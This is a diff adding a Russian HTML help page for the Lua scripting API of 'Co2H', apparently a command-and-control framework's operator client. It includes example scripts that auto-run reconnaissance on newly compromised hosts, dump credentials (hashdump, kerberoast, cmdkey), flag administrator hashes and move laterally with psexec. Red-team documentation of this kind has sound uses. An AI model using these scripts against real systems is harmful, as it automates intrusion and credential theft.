@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Lua-скриптинг — Co2H</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="crumbs"><a href="index.html">Co2H</a> › <a href="ui-overview.html">Интерфейс оператора</a> › Lua-скриптинг</nav>
+
+<h1>Lua-скриптинг</h1>
+
+<p>Co2H содержит встроенный Lua 5.4 движок, позволяющий автоматизировать действия оператора
+без перекомпиляции клиента. Скрипты реагируют на события (новый бикон, вывод задачи, чат),
+регистрируют пользовательские команды в консоли и отправляют задачи биконам.</p>
+
+<div class="note">Скрипты работают на стороне клиента, не на сервере и не на биконе.
+Они автоматизируют то, что оператор делал бы вручную в консоли.</div>
+
+<h2 id="location">Расположение скриптов</h2>
+
+<p>Скрипты хранятся в папке <code>scripts/</code> рядом с <code>co2h-client.exe</code>:</p>
+
+<pre>bin/
+  co2h-client.exe
+  scripts/
+    auto_enum.lua
+    grab_creds.lua
+    my_workflow.lua</pre>
+
+<p>При запуске клиента все файлы <code>*.lua</code> из этой папки загружаются автоматически.
+Файлы с расширением <code>.lua.example</code> игнорируются — они используются как шаблоны.</p>
+
+<p>Скрипты можно также загружать и перезагружать в любой момент через вкладку
+<a href="#tab">Scripts</a> без перезапуска клиента.</p>
+
+<h2 id="tab">Вкладка Scripts</h2>
+
+<p>Вкладка <b>Scripts</b> находится между Audit и Logs в главной панели вкладок.</p>
+
+<table>
+<tr><th>Элемент</th><th>Назначение</th></tr>
+<tr><td>Список (верхняя половина)</td><td>Загруженные <code>.lua</code> файлы</td></tr>
+<tr><td>Лог (нижняя половина)</td><td>Вывод вызовов <code>log()</code> из скриптов с временными метками</td></tr>
+<tr><td>Load script...</td><td>Открыть диалог выбора <code>.lua</code> файла для загрузки</td></tr>
+<tr><td>Reload all</td><td>Перезагрузить все скрипты из <code>scripts/</code> и вручную загруженные</td></tr>
+<tr><td>Open scripts folder</td><td>Открыть папку <code>scripts/</code> в проводнике</td></tr>
+</table>
+
+<h2 id="api">API скриптового движка</h2>
+
+<h3 id="api-task">task(beacon_id, cmd_text)</h3>
+<p>Отправить команду бикону. Эквивалент ввода команды в консоли оператором.</p>
+<pre>task("abc123", "shell whoami")
+task("abc123", "ps")
+task("abc123", "hashdump 2")</pre>
+
+<div class="note"><code>beacon_id</code> — строка, идентификатор бикона (первая колонка вкладки Sessions).
+Команда проходит через тот же диспатчер, что и ручной ввод: все аргументы, синтаксис
+и поведение одинаковы.</div>
+
+<h3 id="api-log">log(text)</h3>
+<p>Вывести строку в лог вкладки Scripts и в панель Logs.</p>
+<pre>log("enumeration started on " .. bid)
+log("found " .. count .. " processes")</pre>
+
+<h3 id="api-alert">alert(title, text)</h3>
+<p>Показать всплывающее окно оператору.</p>
+<pre>alert("High-value target", "Administrator hash found on " .. bid)</pre>
+
+<h3 id="api-beacons">beacons()</h3>
+<p>Вернуть таблицу (массив) всех активных биконов на момент вызова.</p>
+<pre>for _, b in ipairs(beacons()) do
+    log(b.id .. " — " .. b.user .. "@" .. b.host)
+end</pre>
+
+<p>Поля каждого элемента:</p>
+<table>
+<tr><th>Поле</th><th>Тип</th><th>Описание</th></tr>
+<tr><td><code>id</code></td><td>string</td><td>Идентификатор бикона</td></tr>
+<tr><td><code>host</code></td><td>string</td><td>Hostname цели</td></tr>
+<tr><td><code>user</code></td><td>string</td><td>Текущий пользователь на цели</td></tr>
+<tr><td><code>arch</code></td><td>string</td><td><code>"x64"</code> или <code>"x86"</code></td></tr>
+<tr><td><code>os</code></td><td>string</td><td><code>"windows"</code> или <code>"linux"</code></td></tr>
+<tr><td><code>pid</code></td><td>integer</td><td>PID процесса бикона</td></tr>
+<tr><td><code>listener</code></td><td>string</td><td>Имя listener'а</td></tr>
+</table>
+
+<h3 id="api-on">on(event_name, callback)</h3>
+<p>Подписаться на событие. Один скрипт может регистрировать несколько обработчиков
+на одно событие; все они будут вызваны.</p>
+<pre>on("beacon_new", function(b)
+    -- b.id, b.host, b.user, b.arch, b.os
+end)
+
+on("task_output", function(bid, tid, output)
+    -- bid    — строка: beacon_id
+    -- tid    — число: task_id
+    -- output — строка: текст вывода
+end)
+
+on("beacon_lost", function(bid)
+    -- bid — строка: beacon_id потерявшегося бикона
+end)
+
+on("chat", function(from, text)
+    -- from — имя оператора
+    -- text — текст сообщения
+end)</pre>
+
+<h3 id="api-command">command(name, help, callback)</h3>
+<p>Зарегистрировать пользовательскую команду в консоли бикона. После загрузки скрипта
+команда доступна в автодополнении наравне со встроенными.</p>
+<pre>command("enum", "Run full host enumeration", function(bid, args)
+    task(bid, "whoami")
+    task(bid, "shell ipconfig /all")
+    task(bid, "shell net user")
+    task(bid, "ps")
+    log("[enum] started on " .. bid)
+end)</pre>
+
+<p>Параметры callback:</p>
+<table>
+<tr><th>Параметр</th><th>Описание</th></tr>
+<tr><td><code>bid</code></td><td>Идентификатор бикона с которым взаимодействует текущая консоль</td></tr>
+<tr><td><code>args</code></td><td>Всё что написано после имени команды (строка, может быть пустой)</td></tr>
+</table>
+
+<h2 id="events">События</h2>
+
+<table>
+<tr><th>Событие</th><th>Когда вызывается</th><th>Аргументы callback</th></tr>
+<tr><td><code>beacon_new</code></td><td>Клиент обнаружил новый бикон при очередном опросе сервера</td><td><code>b</code> — таблица с полями id, host, user, arch, os</td></tr>
+<tr><td><code>beacon_lost</code></td><td>Бикон пропал из списка (timeout &gt; 3 минут)</td><td><code>bid</code> — строка</td></tr>
+<tr><td><code>task_output</code></td><td>Получен вывод любой задачи от сервера</td><td><code>bid, tid, output</code></td></tr>
+<tr><td><code>chat</code></td><td>Получено чат-сообщение от любого оператора</td><td><code>from, text</code></td></tr>
+</table>
+
+<div class="note"><b>Важно:</b> скрипты загружаются при старте клиента именно чтобы успеть
+зарегистрировать обработчики <code>beacon_new</code> до появления биконов.
+Если загрузить скрипт позже — уже подключённые биконы пропущены, но новые будут обработаны.</div>
+
+<h2 id="examples">Примеры</h2>
+
+<h3>Автоматическая разведка при появлении бикона</h3>
+<pre>on("beacon_new", function(b)
+    log("[auto] new beacon: " .. b.user .. "@" .. b.host .. " (" .. b.arch .. ")")
+    task(b.id, "whoami")
+    task(b.id, "ps")
+    task(b.id, "pwd")
+    if b.os == "windows" then
+        task(b.id, "shell net user")
+        task(b.id, "shell ipconfig /all")
+    end
+end)</pre>
+
+<h3>Уведомление при обнаружении хеша администратора</h3>
+<pre>on("task_output", function(bid, tid, output)
+    if output:find("Administrator:500:") then
+        alert("High-value target", "Admin hash found on beacon " .. bid)
+        log("[!] admin hash on " .. bid)
+    end
+end)</pre>
+
+<h3>Пользовательская команда для дампа учётных данных</h3>
+<pre>command("grab", "Dump all credential sources", function(bid, args)
+    task(bid, "hashdump 2")
+    task(bid, "kerberoast")
+    task(bid, "shell cmdkey /list")
+    log("[grab] credential dump started on " .. bid)
+end)</pre>
+
+<h3>Пользовательская команда с аргументами</h3>
+<pre>-- Использование: lateral 192.168.1.10 administrator
+command("lateral", "Quick lateral move: lateral &lt;ip&gt; &lt;user&gt;", function(bid, args)
+    local parts = {}
+    for w in args:gmatch("%S+") do parts[#parts+1] = w end
+    if #parts < 2 then
+        log("[lateral] usage: lateral &lt;ip&gt; &lt;user&gt;")
+        return
+    end
+    local ip, user = parts[1], parts[2]
+    task(bid, "psexec_cmd " .. ip .. " whoami")
+    log("[lateral] moving to " .. ip .. " as " .. user)
+end)</pre>
+
+<h3>Список всех биконов из скрипта</h3>
+<pre>command("listall", "Print all active beacons", function(bid, args)
+    local all = beacons()
+    log("Active beacons: " .. #all)
+    for _, b in ipairs(all) do
+        log("  " .. b.id .. " " .. b.user .. "@" .. b.host .. " [" .. b.arch .. "]")
+    end
+end)</pre>
+
+<h2 id="errors">Обработка ошибок</h2>
+
+<p>Если в скрипте возникает ошибка Lua (синтаксическая или в runtime), она не
+обрушивает клиент. Сообщение об ошибке выводится в лог вкладки Scripts:</p>
+
+<pre>[03:52:24] [script] error loading my_script.lua: [string]:5: attempt to call a nil value</pre>
+
+<p>При ошибке в callback'е события:</p>
+
+<pre>[03:52:30] [script] beacon_new error: [string]:12: attempt to concatenate a nil value</pre>
+
+<div class="warning">Ошибка в одном callback'е не блокирует остальные обработчики того же события —
+они будут вызваны в том же порядке.</div>
+
+<h2 id="tips">Рекомендации</h2>
+
+<ul>
+<li>Называйте скрипты описательно: <code>auto_enum.lua</code>, <code>alert_da.lua</code>, <code>grab_creds.lua</code></li>
+<li>Один скрипт — одна задача. Не делайте «мега-скрипт» на все случаи жизни</li>
+<li>Используйте <code>log()</code> для диагностики — вывод виден в реальном времени</li>
+<li>Перед использованием <code>beacons()</code> в <code>beacon_new</code> учтите, что новый бикон
+    уже добавлен в список к моменту вызова callback</li>
+<li>Шаблоны-примеры поставляются с расширением <code>.lua.example</code> — скопируйте,
+    переименуйте в <code>.lua</code> и адаптируйте</li>
+<li>Для перезагрузки скрипта после редактирования — кнопка <b>Reload all</b> во вкладке Scripts</li>
+</ul>
+
+</body>
+</html>
